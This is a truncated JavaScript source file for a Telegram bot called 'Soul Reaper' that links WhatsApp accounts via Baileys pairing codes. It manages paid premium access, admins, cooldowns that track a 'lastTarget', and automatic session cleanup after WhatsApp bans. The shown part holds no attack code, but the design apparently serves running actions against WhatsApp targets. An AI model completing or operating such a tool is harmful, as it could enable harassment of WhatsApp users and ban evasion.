const {
  Telegraf,
  Markup
} = require("telegraf");
const fs = require('fs');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  jidEncode,
  encodeWAMessage,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const path = require("path");
const moment = require('moment-timezone');
//S
const {
  BOT_TOKEN,
  allowedDevelopers
} = require("./config");
const crypto = require('crypto');
const bot = new Telegraf(BOT_TOKEN, {
  handlerTimeout: 9_000_000
});
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
function getReplyMessageId(ctx) {
  if (ctx?.message?.message_id) return ctx.message.message_id;
  if (ctx?.update?.callback_query?.message?.message_id)
    return ctx.update.callback_query.message.message_id;
  return undefined;
}
async function denyNotAuthorized(ctx) {
  if (ctx?.update?.callback_query) {
    try {
      await ctx.answerCbQuery();
    } catch {}
  }
  return await ctx.reply("Who are you??????", {
    reply_to_message_id: getReplyMessageId(ctx),
    reply_markup: {
      inline_keyboard: [
        [{
          text: "💬 t.me/zihardev",
          url: "https://t.me/zihardev"
        }]
      ]
    }
  });
}
async function guardOwnerOnly(ctx) {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    await denyNotAuthorized(ctx);
    return false;
  }
  return true;
}
async function guardOwnerOrAdmin(ctx) {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
    await denyNotAuthorized(ctx);
    return false;
  }
  return true;
}
const store = makeInMemoryStore({
  logger: pino({
    level: 'silent'
  })
});
const CD_FILE = path.resolve(process.cwd(), "cd.json");
const COOLDOWN_AFTER_DONE_MS = 3 * 60 * 1000;
const activeRunLocks = new Set();
function ensureCdFile() {
  if (!fs.existsSync(CD_FILE)) {
    fs.writeFileSync(CD_FILE, JSON.stringify({}, null, 2));
  }
}
function loadCdData() {
  ensureCdFile();
  try {
    const raw = fs.readFileSync(CD_FILE, "utf8");
    const data = raw ? JSON.parse(raw) : {};
    return data && typeof data === "object" ? data : {};
  } catch {
    fs.writeFileSync(CD_FILE, JSON.stringify({}, null, 2));
    return {};
  }
}
function saveCdData(data) {
  ensureCdFile();
  fs.writeFileSync(CD_FILE, JSON.stringify(data, null, 2));
}
function cleanupExpiredCd(data) {
  const now = Date.now();
  for (const [uid, info] of Object.entries(data)) {
    if (!info || typeof info !== "object") {
      delete data[uid];
      continue;
    }
    if (info.state === "cooldown" && info.until && now >= info.until) {
      delete data[uid];
      continue;
    }
    if (info.state === "running" && info.endAt && now >= info.endAt) {
      data[uid] = {
        state: "cooldown",
        until: now + COOLDOWN_AFTER_DONE_MS,
        lastTarget: info.lastTarget || null,
        lastDoneAt: now
      };
    }
  }
  return data;
}
function getUserState(userId) {
  const uid = String(userId);
  let data = loadCdData();
  data = cleanupExpiredCd(data);
  saveCdData(data);
  return data[uid] || null;
}
function setUserRunning(userId, payload) {
  const uid = String(userId);
  let data = loadCdData();
  data = cleanupExpiredCd(data);
  data[uid] = {
    state: "running",
    startedAt: payload.startedAt,
    endAt: payload.endAt,
    durationMs: payload.durationMs,
    lastTarget: payload.lastTarget || null
  };
  saveCdData(data);
}
function setUserCooldown(userId, payload) {
  const uid = String(userId);
  let data = loadCdData();
  data = cleanupExpiredCd(data);
  data[uid] = {
    state: "cooldown",
    until: payload.until,
    lastTarget: payload.lastTarget || null,
    lastDoneAt: payload.lastDoneAt || Date.now()
  };
  saveCdData(data);
}
function msToHuman(ms) {
  if (ms <= 0) return "0 detik";
  const s = Math.ceil(ms / 1000);
  const m = Math.floor(s / 60);
  const r = s % 60;
  if (m <= 0) return `${r} detik`;
  return `${m} menit ${r} detik`;
}
const PREM_FILE = path.resolve(process.cwd(), "premuserzbotZIHAR.json");
function ensurePremFile() {
  if (!fs.existsSync(PREM_FILE)) {
    fs.writeFileSync(PREM_FILE, JSON.stringify({}, null, 2));
  }
}
function loadPremData() {
  ensurePremFile();
  try {
    const raw = fs.readFileSync(PREM_FILE, "utf8");
    const data = raw ? JSON.parse(raw) : {};
    return data && typeof data === "object" ? data : {};
  } catch {
    fs.writeFileSync(PREM_FILE, JSON.stringify({}, null, 2));
    return {};
  }
}
function savePremData(data) {
  ensurePremFile();
  fs.writeFileSync(PREM_FILE, JSON.stringify(data, null, 2));
}
function cleanupExpiredPrem(data) {
  const now = Date.now();
  for (const [uid, info] of Object.entries(data)) {
    if (!info || typeof info !== "object") {
      delete data[uid];
      continue;
    }
    const exp = Number(info.expiresAt || 0);
    if (!exp || isNaN(exp) || now >= exp) {
      delete data[uid];
    }
  }
  return data;
}
function parseDays(input) {
  if (!input) return null;
  const s = String(input)
    .trim()
    .toLowerCase();
  const m = s.match(/^(\d{1,4})d$/); // contoh: 3d
  if (!m) return null;
  const days = parseInt(m[1], 10);
  if (isNaN(days)) return null;
  return days;
}
function formatWIB(tsMs) {
  return moment(tsMs)
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY HH:mm:ss") + " WIB";
}
function addOrExtendPremiumUser(userId, days, addedBy = null) {
  const uid = String(userId);
  const now = Date.now();
  let data = loadPremData();
  data = cleanupExpiredPrem(data);
  const existing = data[uid] || null;
  const baseTime =
    existing && existing.expiresAt && now < Number(existing.expiresAt) ?
    Number(existing.expiresAt) :
    now;
  const oldExpiresAt =
    existing && existing.expiresAt ? Number(existing.expiresAt) : null;
  const newExpiresAt = baseTime + days * 24 * 60 * 60 * 1000;
  data[uid] = {
    addedAt: existing?.addedAt || now,
    expiresAt: newExpiresAt,
    addedBy: addedBy ? String(addedBy) : (existing?.addedBy || null),
    lastExtendAt: now
  };
  savePremData(data);
  return {
    wasPremium: !!(existing && oldExpiresAt && now < oldExpiresAt),
    oldExpiresAt,
    newExpiresAt
  };
}
function getPremiumInfo(userId) {
  const uid = String(userId);
  let data = loadPremData();
  data = cleanupExpiredPrem(data);
  savePremData(data);
  return data[uid] || null;
}
function isPremiumUser(userId) {
  return !!getPremiumInfo(userId);
}
const checkPremium = async (ctx, next) => {
  if (isPremiumUser(ctx.from.id)) {
    return await next();
  } else {
    const premiumMessage = `
  𐊖𐊒𐌵𐎘
 ╔══════════════════
 ║ ❌ ACCESS DENIED!
 ║ 💎 Status: NON-PREMIUM
 ║ ⚠️ Need Premium Access
 ╚══════════════════`;

    return await ctx.reply(premiumMessage, {
      reply_markup: {
        inline_keyboard: [
          [{
            text: "💫 UPGRADE TO PREMIUM",
            url: "https://t.me/zihardev",
          }, ],
          [{
            text: "📖 PREMIUM FEATURES",
            callback_data: "premiuminfo",
          }, ],
        ],
      },
    });
  }
};
bot.action("premiuminfo", async (ctx) => {
  try {
    await ctx.answerCbQuery("📖 Premium info", {
      show_alert: false
    });
    const userId = ctx.from.id;
    const info = getPremiumInfo(userId);
    let statusText = "❌ NON-PREMIUM";
    let expText = "-";
    if (info) {
      statusText = "✅ PREMIUM ACTIVE";
      expText = formatWIB(info.expiresAt);
    }
    const text = `
┌─ ᴀᴄᴄᴏᴜɴᴛ sᴛᴀᴛᴜs
│ • Status   : ${statusText}
│ • Expired  : ${expText}
└─────────────────────

┌─ ᴘʀᴇᴍɪᴜᴍ ғᴇᴀᴛᴜʀᴇs
│ ✓ Access all premium commands
│ ✓ Priority support
│ ✓ Unlimited usage
│ ✓ Exclusive feature updates
└─────────────────────

┌─ ʜᴏᴡ ᴛᴏ ᴜᴘɢʀᴀᴅᴇ
│ • Click "UPGRADE" button
│ • Contact admin for activation
└─────────────────────

» © 𐊖𐊒𐌵𐎘 | @zihardev
`.trim();

    await ctx.reply(text, {
      reply_to_message_id: ctx.update.callback_query.message.message_id,
      reply_markup: {
        inline_keyboard: [
          [{
            text: "💫 UPGRADE TO PREMIUM",
            url: "https://t.me/zihardev"
          }],
          [{
            text: "✅ CEK PREMIUM SAYA",
            callback_data: "cekprem_me"
          }]
        ]
      }
    });
  } catch (error) {
    console.error("Error premiuminfo:", error);
  }
});
bot.action("cekprem_me", async (ctx) => {
  try {
    await ctx.answerCbQuery("📊 check your account status", {
      show_alert: false
    });
    const userId = ctx.from.id;
    const info = getPremiumInfo(userId);
    if (!info) {
      return await ctx.reply("❌ you are not a premium member / your membership has expired.", {
        reply_to_message_id: ctx.update.callback_query.message.message_id
      });
    }
    const sisaMs = info.expiresAt - Date.now();
    const sisaMenit = Math.ceil(sisaMs / 60000);
    await ctx.reply(
      `✅ Active premium!\n• Expired: ${formatWIB(info.expiresAt)}\n• Remaining: ~${sisaMenit} menit`, {
        reply_to_message_id: ctx.update.callback_query.message.message_id
      }
    );
  } catch (error) {
    console.error("Error cekprem_me:", error);
  }
});
function deletePremiumUser(userId) {
  const uid = String(userId);
  let data = loadPremData();
  data = cleanupExpiredPrem(data);
  const existed = !!data[uid];
  if (existed) {
    delete data[uid];
    savePremData(data);
  } else {
    savePremData(data);
  }
  return existed;
}
const ADMINS_FILE = path.resolve(process.cwd(), "admins.json");
let adminList = [];
function ensureAdminsFile() {
  if (!fs.existsSync(ADMINS_FILE)) {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify([], null, 2));
  }
}
function loadAdmins() {
  ensureAdminsFile();
  try {
    const raw = fs.readFileSync(ADMINS_FILE, "utf8");
    const data = raw ? JSON.parse(raw) : [];
    adminList = Array.isArray(data) ? data.map((x) => String(x)) : [];
  } catch (error) {
    console.error("Gagal memuat daftar admin:", error);
    adminList = [];
    fs.writeFileSync(ADMINS_FILE, JSON.stringify([], null, 2));
  }
  return adminList;
}
function saveAdmins() {
  ensureAdminsFile();
  fs.writeFileSync(ADMINS_FILE, JSON.stringify(adminList, null, 2));
}
function normalizeId(userId) {
  return String(userId)
    .trim();
}
function isAdmin(userId) {
  loadAdmins(); // selalu refresh dari file biar konsisten
  const uid = normalizeId(userId);
  return adminList.includes(uid);
}
function addAdmin(userId) {
  loadAdmins();
  const uid = normalizeId(userId);
  if (!adminList.includes(uid)) {
    adminList.push(uid);
    saveAdmins();
    return true;
  }
  return false;
}
function removeAdmin(userId) {
  loadAdmins();
  const uid = normalizeId(userId);
  const before = adminList.length;
  adminList = adminList.filter((id) => id !== uid);
  const changed = adminList.length !== before;
  if (changed) saveAdmins();
  else saveAdmins();

  return changed;
}
let sock = null;
let isWhatsAppConnected = false;
const usePairingCode = true;
let maintenanceConfig = {
  maintenance_mode: false,
  message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let ownerList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let whatsappUserInfo = null;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const isOwner = (userId) => {
  if (ownerList.includes(userId.toString())) {
    ownerataubukan = "✅";
    return true;
  } else {
    ownerataubukan = "❌";
    return false;
  }
};

const OWNER_ID = (userId) => {
  if (allowedDevelopers.includes(userId.toString())) {
    ysudh = "✅";
    return true;
  } else {
    gnymbung = "❌";
    return false;
  }
};

// ============================================
// SESSION MANAGEMENT
// ============================================
const userSessions = new Map(); 
const sessionDir = path.join(__dirname, 'sessions');

if (!fs.existsSync(sessionDir)) {
  fs.mkdirSync(sessionDir, { recursive: true });
}

function getUserSessionPath(userId) {
  const userDir = path.join(sessionDir, `user_${userId}`);
  if (!fs.existsSync(userDir)) {
    fs.mkdirSync(userDir, { recursive: true });
  }
  return userDir;
}

function getUserSocket(userId) {
  const session = userSessions.get(userId);
  if (!session || !session.isConnected) {
    return null;
  }
  return session.sock;
}

function hasActiveSession(userId) {
  const session = userSessions.get(userId);
  return session && session.isConnected;
}

// ============================================
// START USER SESSION
// ============================================
const startUserSession = async (userId, phoneNumber = null) => {
  const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion
  } = require('@whiskeysockets/baileys');
  
  const maxRetries = 3;
  const retryDelay = 5000;
  
  let userSession = userSessions.get(userId);
  if (!userSession) {
    userSession = {
      sock: null,
      isConnected: false,
      phoneNumber: phoneNumber,
      retryCount: 0
    };
    userSessions.set(userId, userSession);
  }
  
  const escapeHTML = (s) => String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  
  const attemptConnection = async () => {
    try {
      const userSessionPath = getUserSessionPath(userId);
      const { state, saveCreds } = await useMultiFileAuthState(userSessionPath);
      const { version } = await fetchLatestBaileysVersion();
      
      const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Soul Reaper', 'Chrome', '1.0.0'],
        getMessage: async (key) => ({
          conversation: 'P',
        }),
        connectTimeoutMs: 60000,
        qrTimeout: 30000,
      };
      
      const sock = makeWASocket(connectionOptions);
      sock.ev.on('creds.update', saveCreds);
      
      userSession = userSessions.get(userId);
      if (userSession) {
        userSession.sock = sock;
      }
      
      sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'open') {
          userSession = userSessions.get(userId);
          if (userSession) {
            userSession.isConnected = true;
            userSession.retryCount = 0;
            if (!userSession.phoneNumber && sock?.user?.id) {
              userSession.phoneNumber = sock.user.id.split(':')[0];
            }
          }
          
          const safeUserIdHTML = escapeHTML(userId);
          const waNameHTML = escapeHTML(sock?.user?.name || "Unknown");
          const waNumberHTML = escapeHTML(sock?.user?.id?.split(":")[0] || "Unknown");
          
          const successMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴄᴏɴɴᴇᴄᴛɪᴏɴ sᴛᴀᴛᴜs ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ᴡʜᴀᴛsᴀᴘᴘ ɪɴғᴏ
│ ✓ Status    : Connected
│ ✓ Name      : ${waNameHTML}
│ ✓ Number    : <tg-spoiler>${waNumberHTML}</tg-spoiler>
└─────────────────────

┌─ sʏsᴛᴇᴍ ɪɴғᴏ
│ • Mode      : Active
│ • Version   : 2.0
│ • Type      : Multi-Device
└─────────────────────

┌─ ᴜsᴇʀ ɪɴғᴏ
│ • User ID   : <tg-spoiler>${safeUserIdHTML}</tg-spoiler>
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
          
          try {
            await bot.telegram.sendMessage(userId, successMessage, {
              parse_mode: "HTML"
            });
            
            if (allowedDevelopers.includes(userId) || adminList.includes(userId)) {
              for (const ownerId of allowedDevelopers) {
                if (ownerId !== userId) {
                  await bot.telegram.sendMessage(
                    ownerId,
                    `✅ User <tg-spoiler>${safeUserIdHTML}</tg-spoiler> connected to WhatsApp`,
                    { parse_mode: "HTML" }
                  );
                }
              }
            }
          } catch (error) {
            console.error(`Error sending connect notification to user ${userId}:`, error);
          }
          
          console.log(chalk.green.bold(`✅ User ${userId} WhatsApp Connected`));
        }
        
        if (connection === 'close') {
          userSession = userSessions.get(userId);
          if (userSession) {
            userSession.isConnected = false;
          }
          
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
          const errMsg = String(lastDisconnect?.error?.message || "");
          const isBanned =
            statusCode === 401 ||
            lastDisconnect?.error?.message?.includes('banned') ||
            lastDisconnect?.error?.message?.includes('Block') ||
            /banned/i.test(errMsg) ||
            /block/i.test(errMsg);
          
          const safeUserIdHTML = escapeHTML(userId);
          
          if (isBanned) {
            const bannedTimeHTML = escapeHTML(new Date().toLocaleString());
            const bannedMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴀᴄᴄᴏᴜɴᴛ ʙᴀɴɴᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✗ Status    : Account Banned ⛔
│ ✗ Time      : ${bannedTimeHTML}
│ ✗ User ID   : <tg-spoiler>${safeUserIdHTML}</tg-spoiler>
└─────────────────────

┌─ ᴀᴄᴛɪᴏɴ
│ • Auto deleting session
│ • Create new WhatsApp number
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
            
            try {
              await bot.telegram.sendMessage(userId, bannedMessage, {
                parse_mode: "HTML"
              });
              
              for (const ownerId of allowedDevelopers) {
                if (ownerId !== userId) {
                  await bot.telegram.sendMessage(
                    ownerId,
                    `⛔ User <tg-spoiler>${safeUserIdHTML}</tg-spoiler> account banned`,
                    { parse_mode: "HTML" }
                  );
                }
              }
              
              const userSessionPath = getUserSessionPath(userId);
              if (fs.existsSync(userSessionPath)) {
                fs.rmSync(userSessionPath, { recursive: true, force: true });
                
                const deleteMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ sᴇssɪᴏɴ ᴅᴇʟᴇᴛᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✓ Session cleared ✅
│ ✓ Ready for new pairing
└─────────────────────

┌─ ɴᴇxᴛ sᴛᴇᴘ
│ • Use /addpairing with new number
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
                
                await bot.telegram.sendMessage(userId, deleteMessage, {
                  parse_mode: "HTML"
                });
              }
              
              userSessions.delete(userId);
              console.log(chalk.red.bold(`⛔ User ${userId} account banned - session deleted`));
              return;
            } catch (error) {
              console.error(`Error handling ban for user ${userId}:`, error);
            }
          }
          
          if (userSession && userSession.retryCount < maxRetries && shouldReconnect) {
            userSession.retryCount++;
            const disconnectTimeHTML = escapeHTML(new Date().toLocaleString());
            const disconnectMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ʟᴏsᴛ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✗ Status         : Disconnected ❌
│ ✗ Time           : ${disconnectTimeHTML}
│ ✗ User ID        : <tg-spoiler>${safeUserIdHTML}</tg-spoiler>
└─────────────────────

┌─ ɪɴғᴏ
│ • Attempt        : ${userSession.retryCount}/${maxRetries}
│ • Auto Reconnect : Yes
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
            
            try {
              await bot.telegram.sendMessage(userId, disconnectMessage, {
                parse_mode: "HTML"
              });
            } catch (error) {
              console.error(`Error sending disconnect notification to user ${userId}:`, error);
            }
            
            console.log(chalk.yellow.bold(`🔄 User ${userId} Retry ${userSession.retryCount}/${maxRetries}`));
            await new Promise(resolve => setTimeout(resolve, retryDelay));
            return attemptConnection();
          }
          
          if (userSession && userSession.retryCount >= maxRetries) {
            const maxRetriesMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✗ Max retries reached ❌
│ ✗ Failed to connect ${maxRetries}x
│ ✗ Possible account issue
│ ✗ User ID : <tg-spoiler>${safeUserIdHTML}</tg-spoiler>
└─────────────────────

┌─ ᴀᴄᴛɪᴏɴ
│ • Auto clearing session...
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
            
            try {
              await bot.telegram.sendMessage(userId, maxRetriesMessage, {
                parse_mode: "HTML"
              });
              
              for (const ownerId of allowedDevelopers) {
                if (ownerId !== userId) {
                  await bot.telegram.sendMessage(
                    ownerId,
                    `❌ User <tg-spoiler>${safeUserIdHTML}</tg-spoiler> max retries reached`,
                    { parse_mode: "HTML" }
                  );
                }
              }
              
              const userSessionPath = getUserSessionPath(userId);
              if (fs.existsSync(userSessionPath)) {
                fs.rmSync(userSessionPath, { recursive: true, force: true });
                
                const clearMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ sᴇssɪᴏɴ ᴄʟᴇᴀʀᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✓ Session deleted ✅
│ ✓ System ready for new setup
└─────────────────────

┌─ ɴᴇxᴛ sᴛᴇᴘ
│ • Use /addpairing to connect new number
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
                
                await bot.telegram.sendMessage(userId, clearMessage, {
                  parse_mode: "HTML"
                });
              }
              
              userSessions.delete(userId);
              console.log(chalk.red.bold(`❌ User ${userId} max retries - session deleted`));
            } catch (error) {
              console.error(`Error handling max retries for user ${userId}:`, error);
            }
          }
          
          if (!shouldReconnect) {
            console.log(chalk.red.bold(`🔴 User ${userId} logged out`));
            userSessions.delete(userId);
          }
        }
      });
      
      return sock;
      
    } catch (error) {
      console.error(`Connection error for user ${userId}:`, error);
      userSession = userSessions.get(userId);
      
      if (userSession && userSession.retryCount < maxRetries) {
        userSession.retryCount++;
        console.log(chalk.yellow.bold(`🔄 User ${userId} Retry ${userSession.retryCount}/${maxRetries}`));
        await new Promise(resolve => setTimeout(resolve, retryDelay));
        return attemptConnection();
      } else {
        try {
          await bot.telegram.sendMessage(
            userId,
            '❌ Failed to initialize connection. Please try /addpairing again.',
            { parse_mode: "HTML" }
          );
        } catch (e) {
          console.error(`Error sending failure message to user ${userId}:`, e);
        }
        userSessions.delete(userId);
        return null;
      }
    }
  };
  
  return attemptConnection();
};

// ============================================
// LOAD EXISTING SESSIONS
// ============================================
const loadExistingSessions = async () => {
  if (!fs.existsSync(sessionDir)) {
    return;
  }
  
  const userDirs = fs.readdirSync(sessionDir).filter(dir => dir.startsWith('user_'));
  if (userDirs.length === 0) {
    console.log(chalk.yellow.bold('📂 No existing sessions found'));
    return;
  }
  
  console.log(chalk.cyan.bold(`📂 Loading ${userDirs.length} existing sessions...`)); 
  
  for (const userDir of userDirs) {
    const userId = parseInt(userDir.replace('user_', ''));
    if (!isNaN(userId)) {
      try {
        console.log(chalk.gray(`  Loading session for user ${userId}...`));
        await startUserSession(userId);
      } catch (error) {
        console.error(chalk.red(`  Failed to load session for user ${userId}:`, error.message));
      }
    }
  }
  
  console.log(chalk.green.bold(`✅ Loaded ${userDirs.length} sessions`));
};

// ============================================
// STARTUP SEQUENCE
// ============================================
(async () => {
  console.log(chalk.whiteBright.bold(`
╭──────────────────────────────────────────────╮
│                                              │
│     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     │
│     ████████████████████████████████████     │    
│     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀     │
│                                              │
│          Welcome to Soul Reaper v2.0         │
│           Multi-Session System               │
│               @zihardev                      │
│                                              │
╰──────────────────────────────────────────────╯
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃        SUCCESSFULLY LOADED MULTI-SESSION         ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
  
  loadAdmins();
  
  // Load existing sessions
  await loadExistingSessions();
  
  console.log(chalk.green.bold('\n✅ Bot is ready!\n'));
})();

//CMD
bot.command("addpairing", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
  const userId = ctx.from.id;
  
  const escapeHTML = (s) =>
    String(s ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
  
  function formatPhoneNumber(number) {
    let cleaned = number.replace(/[^0-9]/g, "");
    cleaned = cleaned.replace(/^\+/, "");
    if (cleaned.startsWith("0")) {
      return "62" + cleaned.slice(1);
    } else if (cleaned.startsWith("62")) {
      return cleaned;
    } else {
      return cleaned;
    }
  }
  
  const args = ctx.message.text.split(/\s+/);
  if (args.length < 2) {
    const helpMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴘᴀɪʀɪɴɢ ɢᴜɪᴅᴇ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

ғᴏʀᴍᴀᴛ:
• /addpairing 628xxxxxxxxxx
• /addpairing +1234567890    
• /addpairing 0812xxxxx

sᴜᴘᴘᴏʀᴛᴇᴅ:
✓ Indonesian numbers (62/0)
✓ International numbers
✓ With/without country code

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`;
    return await ctx.reply(helpMessage);
  }
  
  let phoneNumber = args.slice(1).join("");
  phoneNumber = formatPhoneNumber(phoneNumber);
  
  try {
    let userSession = userSessions.get(userId);
    if (userSession && userSession.isConnected) {
      const connectedNum = escapeHTML(userSession.phoneNumber || "Connected");
      return await ctx.reply(
        `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴀʟʀᴇᴀᴅʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ sᴛᴀᴛᴜs
│ ✓ You already have active session
│ ✓ Number: <tg-spoiler>${connectedNum}</tg-spoiler>
└─────────────────────

┌─ ᴀᴄᴛɪᴏɴs
│ • Use /mysession to check
│ • Use /deletesession to remove
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`,
        { parse_mode: "HTML" }
      );
    }
    
    await ctx.reply("⏳ Initializing your WhatsApp connection...");
    
    const sock = await startUserSession(userId, phoneNumber);
    if (!sock) {
      throw new Error("Failed to initialize WhatsApp socket");
    }
    
    await new Promise((resolve) => setTimeout(resolve, 3000));
    await ctx.reply("⏳ Processing pairing request...");
    
    let pairingCode;
    let retryCount = 0;
    const maxRetries = 3;
    
    while (retryCount < maxRetries && !pairingCode) {
      try {
        pairingCode = await sock.requestPairingCode(phoneNumber);
        if (!pairingCode || pairingCode.length < 4) {
          throw new Error("Invalid pairing code received");
        }
      } catch (error) {
        retryCount++;
        if (retryCount === maxRetries) throw error;
        await new Promise((resolve) => setTimeout(resolve, 2000));
      }
    }
    
    userSession = userSessions.get(userId);
    if (userSession) {
      userSession.phoneNumber = phoneNumber;
    }
    
    const userIdHTML = escapeHTML(userId);
    const phoneHTML = escapeHTML(phoneNumber);
    const pairingCodeHTML = escapeHTML(pairingCode);
    
    const initialMsg = await ctx.reply(
      `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>YOUR PAIRING CODE:</b>

<pre>${pairingCodeHTML}</pre>

<i>👆 Tap code above to copy</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
│ • User ID   : <tg-spoiler>${userIdHTML}</tg-spoiler>
│ • Number    : ${phoneHTML}
│ • Status    : Active ✅
│ • Expires   : 60 seconds
└─────────────────────

┌─ ɪɴsᴛʀᴜᴄᴛɪᴏɴs
│ 1. Tap code or button to copy
│ 2. Open WhatsApp
│ 3. Settings → Linked Devices
│ 4. Link a Device
│ 5. Paste the code
└─────────────────────

┌─ ɴᴏᴛᴇ
│ ⚠ Keep code private
│ ⚠ Use official WhatsApp only
│ ⚠ This is YOUR personal session
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━
» © 𐊖𐊒𐌵𐎘 | @zihardev`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "📋 COPY CODE", callback_data: `copy_${pairingCode}` }]],
        },
      }
    );
    
    let timeLeft = 60;
    const countdownInterval = setInterval(async () => {
      timeLeft--;
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        try {
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            initialMsg.message_id,
            null,
            `━━━━━━━━━━━━━━━━━━━━━━━━━━
    ⸸ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

